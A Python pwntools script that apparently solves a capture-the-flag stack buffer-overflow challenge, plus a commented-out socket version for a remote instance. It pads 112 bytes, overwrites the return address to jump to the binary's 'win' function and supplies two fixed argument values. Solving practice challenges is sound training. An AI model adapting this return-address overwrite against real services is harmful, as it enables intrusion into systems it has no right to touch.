#!/usr/bin/env python3


import argparse
import pwn

elf = pwn.ELF("./vuln")

# print(hex(elf.symbols["win"]))

p = elf.process()
# g = pwn.gdb.attach(p)

print(p.recv().decode("utf-8"))

offset = 112

new_eip = pwn.p32(elf.symbols["win"])
return_address = pwn.p32(elf.symbols["main"])
# print(new_eip)

payload = b"".join(
	[
		b"A" * offset,
		new_eip,
		return_address,
		pwn.p32(0xCAFEF00D),
		pwn.p32(0xF00DF00D),
	]
)

p.send(payload + b"\n")
# print(p.recv().decode("utf-8"))

p.interactive()


# parser = argparse.ArgumentParser()
# parser.add_argument("host", type=str, help="The hostname or IP address to connect to")
# parser.add_argument("port", type=int, help="The port to connect to")
# args = parser.parse_args()

# offset = 44
# new_eip = struct.pack("<I", 0x08049296) # b"\x96\x92\x04\x08"

# payload = b"".join(
# 	[
# 		b"A" * offset,
# 		new_eip,
# 	]
# )

# with socket.socket() as connection:

# 	connection.connect((args.host, args.port))
# 	print(connection.recv(4096).decode())
# 	connection.send(payload + b"\n")
# 	print(connection.recv(4096).decode())

